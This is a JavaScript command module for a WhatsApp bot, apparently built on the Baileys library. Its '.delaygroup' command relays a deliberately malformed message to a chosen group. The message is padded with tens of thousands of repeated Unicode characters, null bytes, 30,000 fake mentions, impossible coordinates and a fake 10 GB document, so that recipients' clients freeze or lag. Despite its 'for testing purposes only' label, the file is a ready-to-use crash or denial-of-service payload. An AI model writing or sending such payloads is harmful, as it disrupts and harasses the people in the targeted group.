export default {
  name: "delaygroup",
  description: "⚠️ Send the original delay payload to a group (for testing purposes only)",
  async execute(sock, msg, args) {
    if (!args[0]) {
      await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Usage: .delaygroup group_jid" });
      return;
    }

    const groupJid = args[0].includes("@g.us") ? args[0] : `${args[0]}@g.us`;

    try {
      let message = {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: " ",
                hasMediaAttachment: false,
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: "bang paket" + "ꦾ".repeat(45000),
                  address: "×",
                },
              },
              body: {
                text: "X-delay" + "ꦾ".repeat(45000),
              },
              nativeFlowMessage: {
                messageParamsJson: "\u0000".repeat(10000),
              },
              contextInfo: {
                participant: groupJid,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 30000 },
                    () =>
                      "1" +
                      Math.floor(Math.random() * 5000000) +
                      "@s.whatsapp.net"
                  ),
                ],
                quotedMessage: {
                  documentMessage: {
                    fileName: "coreXdelay.js",
                    mimetype: "text/plain",
                    fileLength: 10000000000,
                    caption: "coreXdelay",
                    pageCount: 1,
                    mediaKey: "\u0000".repeat(90),
                    jpegThumbnail: Buffer.from(""),
                  },
                },
              },
            },
          },
        },
      };

      await sock.relayMessage(groupJid, message, {
        messageId: null,
        participant: { jid: groupJid },
        userJid: groupJid,
      });

      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Delay payload sent to group:\n${groupJid}` });
    } catch (e) {
      console.error(e);
      await sock.sendMessage(msg.key.remoteJid, { text: `❌ Error: ${e.message}` });
    }
  },
};
